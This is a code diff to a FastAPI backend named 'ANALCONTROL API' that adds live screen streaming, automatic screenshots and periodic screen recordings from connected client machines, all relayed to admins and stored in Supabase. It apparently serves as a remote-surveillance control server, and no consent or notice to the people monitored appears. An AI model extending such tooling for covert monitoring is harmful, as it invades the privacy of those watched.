@@ -35,8 +35,8 @@ logger = logging.getLogger(__name__)
 # ========== CREATE FASTAPI APP ==========
 app = FastAPI(
     title="ANALCONTROL API",
-    version="3.0",
-    description="Advanced Client Monitoring System with Supabase",
+    version="4.0",
+    description="Advanced Client Monitoring System with Screen Streaming",
     docs_url="/docs",
     redoc_url="/redoc",
     openapi_url="/openapi.json"
@@ -431,6 +431,9 @@ class ConnectionManager:
         self.connection_times: Dict[str, float] = {}
         self.pending_messages: Dict[str, List[dict]] = {}
         self.active_recordings: Dict[str, bool] = {}
+        self.active_streams: Dict[str, bool] = {}
+        self.auto_screenshots: Dict[str, bool] = {}
+        self.auto_recordings: Dict[str, bool] = {}
 
     async def connect_admin(self, websocket: WebSocket):
         await websocket.accept()
@@ -548,6 +551,11 @@ class ConnectionManager:
                 break
         
         if client_id:
+            # Stop any active features
+            self.stop_streaming(client_id)
+            self.stop_auto_screenshots(client_id)
+            self.stop_auto_recordings(client_id)
+            
             del self.client_connections[client_id]
             if client_id in self.connection_times:
                 del self.connection_times[client_id]
@@ -684,6 +692,11 @@ class ConnectionManager:
             except:
                 pass
             
+            # Stop active features
+            self.stop_streaming(client_id)
+            self.stop_auto_screenshots(client_id)
+            self.stop_auto_recordings(client_id)
+            
             del self.client_connections[client_id]
             if client_id in self.connection_times:
                 del self.connection_times[client_id]
@@ -701,6 +714,42 @@ class ConnectionManager:
     def is_recording(self, client_id: str) -> bool:
         """Check if client is recording"""
         return self.active_recordings.get(client_id, False)
+    
+    def start_streaming(self, client_id: str):
+        """Mark client as streaming"""
+        self.active_streams[client_id] = True
+    
+    def stop_streaming(self, client_id: str):
+        """Stop streaming on client"""
+        self.active_streams.pop(client_id, None)
+    
+    def is_streaming(self, client_id: str) -> bool:
+        """Check if client is streaming"""
+        return self.active_streams.get(client_id, False)
+    
+    def start_auto_screenshots(self, client_id: str):
+        """Mark client as auto-screenshotting"""
+        self.auto_screenshots[client_id] = True
+    
+    def stop_auto_screenshots(self, client_id: str):
+        """Stop auto screenshots on client"""
+        self.auto_screenshots.pop(client_id, None)
+    
+    def is_auto_screenshots(self, client_id: str) -> bool:
+        """Check if client is auto-screenshotting"""
+        return self.auto_screenshots.get(client_id, False)
+    
+    def start_auto_recordings(self, client_id: str):
+        """Mark client as auto-recording"""
+        self.auto_recordings[client_id] = True
+    
+    def stop_auto_recordings(self, client_id: str):
+        """Stop auto recordings on client"""
+        self.auto_recordings.pop(client_id, None)
+    
+    def is_auto_recordings(self, client_id: str) -> bool:
+        """Check if client is auto-recording"""
+        return self.auto_recordings.get(client_id, False)
 
 manager = ConnectionManager()
 
@@ -1019,6 +1068,13 @@ async def get_clients(
         # Mark clients as online if they have active WebSocket connections
         for client in clients_list:
             client["ws_online"] = client.get("client_id") in manager.client_connections
+        
+        # Add streaming status
+        for client in clients_list:
+            client_id = client.get("client_id")
+            client["is_streaming"] = manager.is_streaming(client_id)
+            client["is_auto_screenshots"] = manager.is_auto_screenshots(client_id)
+            client["is_auto_recordings"] = manager.is_auto_recordings(client_id)
         
         # Sort by last seen
         clients_list.sort(key=lambda x: x.get("last_seen", ""), reverse=True)
@@ -1872,6 +1928,205 @@ async def delete_recording(
         logger.error(f"Delete recording error: {e}")
         raise HTTPException(status_code=500, detail="Internal server error")
 
+# ========== SCREEN STREAMING ROUTES ==========
+
+@app.post("/api/start-screen-stream", response_model=dict)
+async def start_screen_stream(data: dict, user: dict = Depends(authenticate_user)):
+    """Start live screen streaming from client"""
+    try:
+        client_id = data.get("client_id")
+        fps = data.get("fps", 10)
+        quality = data.get("quality", "medium")
+        
+        if not client_id:
+            raise HTTPException(status_code=400, detail="Client ID required")
+        
+        # Send via WebSocket to start streaming
+        sent = await manager.send_to_client(client_id, {
+            "type": "start_screen_stream",
+            "fps": fps,
+            "quality": quality,
+            "timestamp": datetime.utcnow().isoformat(),
+            "from_user": user.get("email", "unknown")
+        })
+        
+        if sent:
+            manager.start_streaming(client_id)
+            await manager.notify_admins({
+                "type": "screen_stream_started",
+                "client_id": client_id,
+                "fps": fps,
+                "quality": quality,
+                "timestamp": datetime.utcnow().isoformat()
+            })
+        
+        return {
+            "success": True,
+            "message": "Screen streaming started",
+            "client_id": client_id,
+            "sent_via_websocket": sent
+        }
+        
+    except Exception as e:
+        logger.error(f"Start screen stream error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.post("/api/stop-screen-stream", response_model=dict)
+async def stop_screen_stream(data: dict, user: dict = Depends(authenticate_user)):
+    """Stop live screen streaming from client"""
+    try:
+        client_id = data.get("client_id")
+        
+        if not client_id:
+            raise HTTPException(status_code=400, detail="Client ID required")
+        
+        sent = await manager.send_to_client(client_id, {
+            "type": "stop_screen_stream",
+            "timestamp": datetime.utcnow().isoformat(),
+            "from_user": user.get("email", "unknown")
+        })
+        
+        if sent:
+            manager.stop_streaming(client_id)
+            await manager.notify_admins({
+                "type": "screen_stream_stopped",
+                "client_id": client_id,
+                "timestamp": datetime.utcnow().isoformat()
+            })
+        
+        return {
+            "success": True,
+            "message": "Screen streaming stopped",
+            "client_id": client_id,
+            "sent_via_websocket": sent
+        }
+        
+    except Exception as e:
+        logger.error(f"Stop screen stream error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.post("/api/start-auto-screenshots", response_model=dict)
+async def start_auto_screenshots(data: dict, user: dict = Depends(authenticate_user)):
+    """Start automatic screenshot capture"""
+    try:
+        client_id = data.get("client_id")
+        interval = data.get("interval", 5)  # seconds
+        
+        if not client_id:
+            raise HTTPException(status_code=400, detail="Client ID required")
+        
+        sent = await manager.send_to_client(client_id, {
+            "type": "start_auto_screenshots",
+            "interval": interval,
+            "timestamp": datetime.utcnow().isoformat(),
+            "from_user": user.get("email", "unknown")
+        })
+        
+        if sent:
+            manager.start_auto_screenshots(client_id)
+        
+        return {
+            "success": True,
+            "message": f"Auto screenshots started ({interval}s interval)",
+            "client_id": client_id,
+            "sent_via_websocket": sent
+        }
+        
+    except Exception as e:
+        logger.error(f"Start auto screenshots error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.post("/api/stop-auto-screenshots", response_model=dict)
+async def stop_auto_screenshots(data: dict, user: dict = Depends(authenticate_user)):
+    """Stop automatic screenshot capture"""
+    try:
+        client_id = data.get("client_id")
+        
+        if not client_id:
+            raise HTTPException(status_code=400, detail="Client ID required")
+        
+        sent = await manager.send_to_client(client_id, {
+            "type": "stop_auto_screenshots",
+            "timestamp": datetime.utcnow().isoformat(),
+            "from_user": user.get("email", "unknown")
+        })
+        
+        if sent:
+            manager.stop_auto_screenshots(client_id)
+        
+        return {
+            "success": True,
+            "message": "Auto screenshots stopped",
+            "client_id": client_id,
+            "sent_via_websocket": sent
+        }
+        
+    except Exception as e:
+        logger.error(f"Stop auto screenshots error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.post("/api/start-auto-recordings", response_model=dict)
+async def start_auto_recordings(data: dict, user: dict = Depends(authenticate_user)):
+    """Start automatic screen recordings"""
+    try:
+        client_id = data.get("client_id")
+        interval = data.get("interval", 60)  # seconds
+        duration = data.get("duration", 30)  # seconds per recording
+        
+        if not client_id:
+            raise HTTPException(status_code=400, detail="Client ID required")
+        
+        sent = await manager.send_to_client(client_id, {
+            "type": "start_auto_recordings",
+            "interval": interval,
+            "duration": duration,
+            "timestamp": datetime.utcnow().isoformat(),
+            "from_user": user.get("email", "unknown")
+        })
+        
+        if sent:
+            manager.start_auto_recordings(client_id)
+        
+        return {
+            "success": True,
+            "message": f"Auto recordings started (every {interval}s, {duration}s each)",
+            "client_id": client_id,
+            "sent_via_websocket": sent
+        }
+        
+    except Exception as e:
+        logger.error(f"Start auto recordings error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.post("/api/stop-auto-recordings", response_model=dict)
+async def stop_auto_recordings(data: dict, user: dict = Depends(authenticate_user)):
+    """Stop automatic screen recordings"""
+    try:
+        client_id = data.get("client_id")
+        
+        if not client_id:
+            raise HTTPException(status_code=400, detail="Client ID required")
+        
+        sent = await manager.send_to_client(client_id, {
+            "type": "stop_auto_recordings",
+            "timestamp": datetime.utcnow().isoformat(),
+            "from_user": user.get("email", "unknown")
+        })
+        
+        if sent:
+            manager.stop_auto_recordings(client_id)
+        
+        return {
+            "success": True,
+            "message": "Auto recordings stopped",
+            "client_id": client_id,
+            "sent_via_websocket": sent
+        }
+        
+    except Exception as e:
+        logger.error(f"Stop auto recordings error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
 @app.get("/api/stats", response_model=dict)
 async def get_stats(user: dict = Depends(authenticate_user)):
     """Get system statistics"""
@@ -1888,7 +2143,10 @@ async def get_stats(user: dict = Depends(authenticate_user)):
             "total_users": 0,
             "active_admins": len(manager.admin_connections),
             "chat_users": len(manager.chat_connections),
-            "active_recordings": len(manager.active_recordings)
+            "active_recordings": len(manager.active_recordings),
+            "active_streams": len(manager.active_streams),
+            "auto_screenshots": len(manager.auto_screenshots),
+            "auto_recordings": len(manager.auto_recordings)
         }
         
         # Get from Supabase if available
@@ -2310,7 +2568,7 @@ async def health_check():
         health_status = {
             "status": "healthy",
             "timestamp": datetime.utcnow().isoformat(),
-            "version": "3.0",
+            "version": "4.0",
             "database": "Supabase + In-Memory" if supabase else "In-Memory",
             "active_clients": len(manager.client_connections),
             "active_admins": len(manager.admin_connections),
@@ -2318,6 +2576,9 @@ async def health_check():
             "total_users": len(db.users),
             "total_clients": len(db.clients),
             "active_recordings": len(manager.active_recordings),
+            "active_streams": len(manager.active_streams),
+            "auto_screenshots": len(manager.auto_screenshots),
+            "auto_recordings": len(manager.auto_recordings),
             "supabase_connected": supabase is not None
         }
         
@@ -2685,6 +2946,148 @@ async def handle_client_message(client_id: str, data: dict, websocket: WebSocket
             "client_id": client_id,
             "timestamp": datetime.utcnow().isoformat()
         })
+    
+    # ========== SCREEN STREAMING MESSAGES ==========
+    elif message_type == "screen_stream_frame":
+        # Handle live screen stream frame
+        image_data = data.get("image_data")
+        frame_number = data.get("frame_number", 0)
+        
+        if image_data:
+            # Send to all admins for live preview
+            await manager.notify_admins({
+                "type": "screen_stream_frame",
+                "client_id": client_id,
+                "frame_number": frame_number,
+                "image_data": image_data,
+                "timestamp": datetime.utcnow().isoformat()
+            })
+    
+    elif message_type == "auto_screenshot":
+        # Handle auto screenshot
+        image_data = data.get("image_data")
+        if image_data:
+            # Store screenshot
+            screenshot_data = {
+                "client_id": client_id,
+                "filename": f"auto_screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png",
+                "image_data": image_data,
+                "size": len(base64.b64decode(image_data)),
+                "created_at": datetime.utcnow().isoformat(),
+                "auto": True
+            }
+            
+            db.add_screenshot(screenshot_data)
+            
+            if supabase:
+                try:
+                    supabase.table("screenshots").insert({
+                        "client_id": client_id,
+                        "filename": screenshot_data["filename"],
+                        "image_data": image_data,
+                        "size": len(base64.b64decode(image_data)),
+                        "created_at": datetime.utcnow().isoformat(),
+                        "auto": True
+                    }).execute()
+                except Exception as e:
+                    logger.error(f"Supabase auto screenshot error: {e}")
+            
+            await manager.notify_admins({
+                "type": "auto_screenshot_received",
+                "client_id": client_id,
+                "filename": screenshot_data["filename"],
+                "timestamp": datetime.utcnow().isoformat()
+            })
+    
+    elif message_type == "auto_recording":
+        # Handle auto recording
+        video_data = data.get("video_data")
+        duration = data.get("duration", 30)
+        
+        if video_data:
+            recording_data = {
+                "client_id": client_id,
+                "filename": f"auto_recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4",
+                "video_data": video_data,
+                "size": len(base64.b64decode(video_data)),
+                "duration": duration,
+                "fps": 30,
+                "created_at": datetime.utcnow().isoformat(),
+                "auto": True
+            }
+            
+            db.add_recording(recording_data)
+            
+            if supabase:
+                try:
+                    supabase.table("recordings").insert({
+                        "client_id": client_id,
+                        "filename": recording_data["filename"],
+                        "video_data": video_data,
+                        "size": len(base64.b64decode(video_data)),
+                        "duration": duration,
+                        "fps": 30,
+                        "created_at": datetime.utcnow().isoformat(),
+                        "auto": True
+                    }).execute()
+                except Exception as e:
+                    logger.error(f"Supabase auto recording error: {e}")
+            
+            await manager.notify_admins({
+                "type": "auto_recording_received",
+                "client_id": client_id,
+                "filename": recording_data["filename"],
+                "duration": duration,
+                "timestamp": datetime.utcnow().isoformat()
+            })
+    
+    elif message_type == "screen_stream_started":
+        manager.start_streaming(client_id)
+        await manager.notify_admins({
+            "type": "screen_stream_started",
+            "client_id": client_id,
+            "timestamp": datetime.utcnow().isoformat()
+        })
+    
+    elif message_type == "screen_stream_stopped":
+        manager.stop_streaming(client_id)
+        await manager.notify_admins({
+            "type": "screen_stream_stopped",
+            "client_id": client_id,
+            "timestamp": datetime.utcnow().isoformat()
+        })
+    
+    elif message_type == "auto_screenshots_started":
+        manager.start_auto_screenshots(client_id)
+        await manager.notify_admins({
+            "type": "auto_screenshots_started",
+            "client_id": client_id,
+            "timestamp": datetime.utcnow().isoformat()
+        })
+    
+    elif message_type == "auto_screenshots_stopped":
+        manager.stop_auto_screenshots(client_id)
+        await manager.notify_admins({
+            "type": "auto_screenshots_stopped",
+            "client_id": client_id,
+            "timestamp": datetime.utcnow().isoformat()
+        })
+    
+    elif message_type == "auto_recordings_started":
+        manager.start_auto_recordings(client_id)
+        await manager.notify_admins({
+            "type": "auto_recordings_started",
+            "client_id": client_id,
+            "timestamp": datetime.utcnow().isoformat()
+        })
+    
+    elif message_type == "auto_recordings_stopped":
+        manager.stop_auto_recordings(client_id)
+        await manager.notify_admins({
+            "type": "auto_recordings_stopped",
+            "client_id": client_id,
+            "timestamp": datetime.utcnow().isoformat()
+        })
 
 @app.websocket("/ws/chat/{user_id}")
 async def websocket_chat(websocket: WebSocket, user_id: str):
@@ -2777,7 +3180,7 @@ async def serve_frontend():
     except:
         return JSONResponse({
             "message": "ANALCONTROL API is running",
-            "version": "3.0",
+            "version": "4.0",
             "theme": "red_black",
             "endpoints": {
                 "login": "/api/login",
@@ -2785,6 +3188,12 @@ async def serve_frontend():
                 "health": "/api/health",
                 "screenshots": "/api/screenshots",
                 "recordings": "/api/recordings",
+                "screen_streaming": {
+                    "start": "/api/start-screen-stream",
+                    "stop": "/api/stop-screen-stream",
+                    "auto_screenshots": "/api/start-auto-screenshots",
+                    "auto_recordings": "/api/start-auto-recordings"
+                },
                 "ws_admin": "/ws/admin",
                 "ws_client": "/ws/client/{client_id}",
                 "ws_chat": "/ws/chat/{user_id}"
@@ -2825,7 +3234,7 @@ async def cleanup_tasks():
 async def startup_event():
     """Initialize application on startup"""
     logger.info("=" * 60)
-    logger.info("🚀 ANALCONTROL API v3.0 Starting...")
+    logger.info("🚀 ANALCONTROL API v4.0 Starting...")
     logger.info(f"📡 Port: {PORT}")
     logger.info(f"🔗 Backend URL: {BACKEND_URL}")
     logger.info(f"🎨 Theme: Red/Black")
@@ -2837,6 +3246,8 @@ async def startup_event():
     logger.info("📚 Documentation: /docs")
     logger.info("📸 Screenshots: /api/screenshots")
     logger.info("🎥 Recordings: /api/recordings")
+    logger.info("📺 Screen Streaming: /api/start-screen-stream")
+    logger.info("🤖 Auto Features: /api/start-auto-screenshots")
     
     # Start background tasks
     asyncio.create_task(cleanup_tasks())
